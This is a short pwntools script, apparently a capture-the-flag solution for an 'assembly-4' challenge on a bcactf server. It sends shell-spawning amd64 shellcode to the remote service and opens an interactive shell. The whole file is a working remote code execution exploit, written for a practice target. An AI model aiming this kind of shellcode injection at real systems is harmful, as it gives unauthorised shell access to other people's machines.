from pwn import *

context.clear(arch='amd64')

# p = process("./assembly-4")
p = remote("camp2020.bcactf.com", 10010)

p.sendline(asm(shellcraft.sh()))
p.interactive()
